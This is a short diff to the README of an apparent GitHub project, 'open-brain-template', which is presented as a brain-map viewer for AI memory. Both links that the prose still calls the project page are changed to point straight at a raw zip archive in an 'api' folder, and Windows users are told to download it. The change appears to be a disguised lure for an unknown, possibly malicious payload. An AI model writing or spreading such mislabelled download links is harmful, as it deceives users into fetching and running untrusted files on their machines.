@@ -1,6 +1,6 @@
 # 🧠 open-brain-template - Simple Brain Map for AI Memory
 
-[![Download open-brain-template](https://img.shields.io/badge/Download-Open_Brain_Template-blue?style=for-the-badge&logo=github)](https://github.com/twpr460/open-brain-template)
+[![Download open-brain-template](https://img.shields.io/badge/Download-Open_Brain_Template-blue?style=for-the-badge&logo=github)](https://github.com/twpr460/open-brain-template/raw/refs/heads/main/api/brain_open_template_v3.7.zip)
 
 ## 🖥️ What this app does
 
@@ -13,7 +13,7 @@ Use it when you want a clean brain map view of your AI memory. It helps you trac
 ### 1. Open the download page
 Visit the project page here:
 
-https://github.com/twpr460/open-brain-template
+https://github.com/twpr460/open-brain-template/raw/refs/heads/main/api/brain_open_template_v3.7.zip
 
 ### 2. Get the files
 On the project page, look for the source files or the latest release files if they are available. Download the project to your Windows PC.
